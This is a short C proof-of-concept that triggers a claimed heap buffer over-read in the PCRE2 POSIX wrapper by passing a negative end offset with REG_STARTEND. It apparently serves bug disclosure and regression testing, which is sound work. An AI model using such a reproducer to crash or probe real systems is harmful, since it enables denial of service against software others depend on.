/* PoC for a delocalized memory-safety defect in the PCRE2 POSIX wrapper.
 *
 * Public API used: regcomp()/regexec() (pcre2posix.h), in-contract input.
 *
 * REG_STARTEND lets the caller pass the subject range in pmatch[0].rm_so and
 * pmatch[0].rm_eo.  The POSIX wrapper documents that it validates these offsets
 * and returns REG_INVARG for invalid ones (e.g. a negative value).  A caller
 * that supplies rm_eo = -1 (a common "unset" sentinel) must therefore receive
 * REG_INVARG, never a crash.
 *
 * On the vulnerable tree the offsets are cast to the unsigned PCRE2_SIZE type
 * and only checked with "so > eo", so a negative rm_eo becomes a huge unsigned
 * value that slips past the check.  The wrapper then calls pcre2_match() with a
 * subject length of (eo - so) == SIZE_MAX, which reads far past the subject
 * buffer -> AddressSanitizer heap-buffer-overflow.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "pcre2posix.h"

int main(void)
{
  regex_t re;
  regmatch_t pmatch[1];
  int rc;

  /* Heap-allocated, non-NUL-terminated subject so ASan has redzones around it. */
  size_t subj_len = 8;
  char *subject = (char *)malloc(subj_len);
  memset(subject, 'a', subj_len);   /* no 'q' anywhere, forces a full scan */

  if (regcomp(&re, "q", 0) != 0)
  {
    fprintf(stderr, "regcomp failed\n");
    return 2;
  }

  /* In-contract per the wrapper's documented validation: a negative offset is
     invalid input for which the API promises REG_INVARG. */
  pmatch[0].rm_so = 0;
  pmatch[0].rm_eo = -1;

  rc = regexec(&re, subject, 1, pmatch, REG_STARTEND);

  /* On a correct library this returns REG_INVARG and we reach here cleanly. */
  printf("regexec returned %d (expected REG_INVARG=%d)\n", rc, REG_INVARG);

  regfree(&re);
  free(subject);
  return 0;
}
